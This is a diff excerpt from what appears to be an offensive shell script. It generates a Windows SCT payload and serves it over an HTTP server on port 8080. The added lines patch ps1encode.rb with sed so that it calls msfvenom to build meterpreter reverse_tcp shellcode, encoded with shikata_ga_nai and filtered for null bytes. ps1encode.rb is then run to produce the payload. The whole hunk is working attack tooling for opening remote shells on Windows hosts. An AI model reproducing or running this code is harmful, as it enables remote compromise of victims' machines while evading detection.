@@ -190,6 +190,9 @@ do
          echo "Generating sct file and launching HTTP Server on port 8080"
          spinner
          cd ps1encode/
+         sed -i '99c\    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} --arch x86 -e x86/shikata_ga_nai -b STRING --platform windows --smallest -f raw > raw_shellcode_temp")' ps1encode.rb
+         sed -i s/STRING/"'\\\\\\\\\\{x00}'"/g ps1encode.rb
+         sed -i s/{x00}/x00/g ps1encode.rb
          ./ps1encode.rb --PAYLOAD windows/meterpreter/reverse_tcp --LHOST=$lhost --LPORT=$lport -t sct
          cd ..
          mkdir site
